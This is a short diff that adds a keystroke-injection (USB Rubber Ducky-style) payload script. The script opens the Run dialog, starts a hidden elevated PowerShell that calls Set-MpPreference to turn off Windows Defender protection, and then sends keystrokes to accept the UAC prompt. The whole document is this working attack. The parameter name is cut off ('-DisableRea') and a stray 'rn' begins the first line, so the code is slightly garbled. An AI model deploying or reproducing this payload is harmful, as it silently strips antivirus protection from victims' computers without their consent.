@@ -1,0 +1,10 @@
+rnREM Turn off Windows Defender
+REM
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+ENTER
+DELAY 2000
+LEFT
+ENTER
